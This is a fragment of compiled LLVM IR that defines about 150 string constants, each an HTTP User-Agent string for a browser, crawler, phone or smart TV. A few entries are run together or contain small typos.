@.str.334 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\00", align 1
@.str.335 = private unnamed_addr constant [117 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET \00", align 1
@.str.336 = private unnamed_addr constant [50 x i8] c"Googlebot/2.1 (http://www.googlebot.com/bot.html)\00", align 1
@.str.337 = private unnamed_addr constant [35 x i8] c"Opera/9.20 (Windows NT 6.0; U; en)\00", align 1
@.str.338 = private unnamed_addr constant [133 x i8] c"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\00", align 1
@.str.339 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)\00", align 1
@.str.340 = private unnamed_addr constant [120 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)\00", align 1
@.str.341 = private unnamed_addr constant [50 x i8] c"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0\00", align 1
@.str.342 = private unnamed_addr constant [160 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\00", align 1
@.str.343 = private unnamed_addr constant [113 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16\00", align 1
@.str.344 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)\00", align 1
@.str.345 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\00", align 1
@.str.346 = private unnamed_addr constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00", align 1
@.str.347 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.348 = private unnamed_addr constant [52 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\00", align 1
@.str.349 = private unnamed_addr constant [48 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)\00", align 1
@.str.350 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0\00", align 1
@.str.351 = private unnamed_addr constant [105 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\00", align 1
@.str.352 = private unnamed_addr constant [90 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\00", align 1
@.str.353 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\00", align 1
@.str.354 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00", align 1
@.str.355 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\00", align 1
@.str.356 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6\00", align 1
@.str.357 = private unnamed_addr constant [75 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0\00", align 1
@.str.358 = private unnamed_addr constant [130 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00", align 1
@.str.359 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.360 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.361 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.362 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.363 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00", align 1
@.str.364 = private unnamed_addr constant [51 x i8] c"Gigabot/3.0 (http://www.gigablast.com/spider.html)\00", align 1
@.str.365 = private unnamed_addr constant [61 x i8] c"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0\00", align 1
@.str.366 = private unnamed_addr constant [127 x i8] c"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+\00", align 1
@.str.367 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+\00", align 1
@.str.368 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.369 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.370 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00", align 1
@.str.371 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00", align 1
@.str.372 = private unnamed_addr constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00", align 1
@.str.373 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00", align 1
@.str.374 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00", align 1
@.str.375 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00", align 1
@.str.376 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00", align 1
@.str.377 = private unnamed_addr constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00", align 1
@.str.378 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00", align 1
@.str.379 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00", align 1
@.str.380 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.381 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00", align 1
@.str.382 = private unnamed_addr constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.383 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00", align 1
@.str.384 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00", align 1
@.str.385 = private unnamed_addr constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00", align 1
@.str.386 = private unnamed_addr constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00", align 1
@.str.387 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.388 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00", align 1
@.str.389 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00", align 1
@.str.390 = private unnamed_addr constant [149 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.391 = private unnamed_addr constant [181 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.392 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.393 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.394 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.395 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.396 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.397 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.398 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.399 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.400 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.401 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.402 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.403 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.404 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.405 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.406 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.407 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.408 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.409 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.410 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.411 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.412 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.413 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.414 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.415 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.416 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.417 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.418 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.419 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.420 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.421 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.422 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.423 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.424 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.425 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.426 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.427 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.428 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.429 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.430 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.431 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.432 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.433 = private unnamed_addr constant [51 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\00", align 1
@.str.434 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.435 = private unnamed_addr constant [121 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)\00", align 1
@.str.436 = private unnamed_addr constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.437 = private unnamed_addr constant [56 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\00", align 1
@.str.438 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4\00", align 1
@.str.439 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.440 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10\00", align 1
@.str.441 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52\00", align 1
@.str.442 = private unnamed_addr constant [138 x i8] c"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\00", align 1
@.str.443 = private unnamed_addr constant [42 x i8] c"Opera/8.5 (X11; i686 Linux; U; ru, en_US)\00", align 1
@.str.444 = private unnamed_addr constant [58 x i8] c"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)\00", align 1
@.str.445 = private unnamed_addr constant [48 x i8] c"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9\00", align 1
@.str.446 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25\00", align 1
@.str.447 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50\00", align 1
@.str.448 = private unnamed_addr constant [80 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant\00", align 1
@.str.449 = private unnamed_addr constant [19 x i8] c"C4PC UserAgent/0.7\00", align 1
@.str.450 = private unnamed_addr constant [19 x i8] c"Googlebot 1.01.003\00", align 1
@.str.451 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\00", align 1
@.str.452 = private unnamed_addr constant [104 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3\00", align 1
@.str.453 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\00", align 1
@.str.454 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\00", align 1
@.str.455 = private unnamed_addr constant [183 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.456 = private unnamed_addr constant [170 x i8] c"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)\00", align 1
@.str.457 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0\00", align 1
@.str.458 = private unnamed_addr constant [195 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)\00", align 1
@.str.459 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.460 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8\00", align 1
@.str.461 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6\00", align 1
@.str.462 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre\00", align 1
@.str.463 = private unnamed_addr constant [117 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre\00", align 1
@.str.464 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre\00", align 1
@.str.465 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00", align 1
@.str.466 = private unnamed_addr constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00", align 1
@.str.467 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00", align 1
@.str.468 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00", align 1
@.str.469 = private unnamed_addr constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00", align 1
@.str.470 = private unnamed_addr constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00", align 1
@.str.471 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.472 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00", align 1
@.str.473 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00", align 1
@.str.474 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00", align 1
@.str.475 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00", align 1
@.str.476 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00", align 1
@.str.477 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00", align 1
@.str.478 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00", align 1
@.str.479 = private unnamed_addr constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00", align 1
@.str.480 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00", align 1
@.str.481 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00", align 1
@.str.482 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.483 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00", align 1
@.str.484 = private unnamed_addr constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00", align 1
@.str.485 = private unnamed_addr constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00", align 1
@.str.486 = private unnamed_addr constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00", align 1
@.str.487 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00", align 1
